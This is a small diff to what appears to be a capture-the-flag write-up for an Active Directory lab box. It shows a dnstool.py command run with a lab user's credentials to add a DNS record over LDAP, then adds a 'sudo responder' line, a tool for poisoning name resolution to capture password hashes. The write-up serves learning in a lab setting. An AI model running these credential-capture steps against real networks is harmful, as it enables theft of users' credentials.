@@ -466,3 +466,7 @@ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpU
 [+] LDAP operation completed successfully
 ```
 Ill start by adding a DNS record
+
+```python
+sudo responder -I tun
+```
